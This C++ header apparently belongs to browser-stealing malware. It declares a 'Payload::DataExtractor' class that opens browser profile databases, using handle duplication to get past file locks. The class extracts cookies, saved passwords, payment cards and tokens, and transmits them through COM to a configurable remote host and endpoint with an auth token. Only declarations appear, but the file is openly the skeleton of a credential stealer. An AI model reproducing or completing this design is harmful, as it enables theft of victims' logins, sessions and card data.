#pragma once
#include "../core/common.hpp"
#include "pipe_client.hpp"
#include "../../libs/sqlite/sqlite3.h"
#include <vector>
#include <string>
#include <windows.h>
#include <comdef.h>

namespace Payload {
    class DataExtractor {
    public:
        // Match this exactly in your .cpp
        DataExtractor(PipeClient& pipe, const std::vector<uint8_t>& key, const std::wstring& targetHost, const std::wstring& endpoint, const std::wstring& authToken = L"", bool upstash = false);
        void ProcessProfile(const std::filesystem::path& profilePath, const std::string& browserName);

    private:
        sqlite3* OpenDatabase(const std::filesystem::path& dbPath);
        sqlite3* OpenDatabaseWithHandleDuplication(const std::filesystem::path& dbPath);
        void CleanupTempFiles();
        
        void ExtractCookies(sqlite3* db);
        void ExtractPasswords(sqlite3* db);
        void ExtractCards(sqlite3* db);
        void ExtractTokens(sqlite3* db);
        
        void TransmitViaCOM(const std::string& data); // Added this
        std::string EscapeJson(const std::string& s);

        PipeClient& m_pipe;
        std::vector<uint8_t> m_key;
        std::wstring m_targetHost;
        std::wstring m_endpoint;
        std::wstring m_authToken;
        bool m_upstash;
        std::vector<std::filesystem::path> m_tempFiles;
    };
}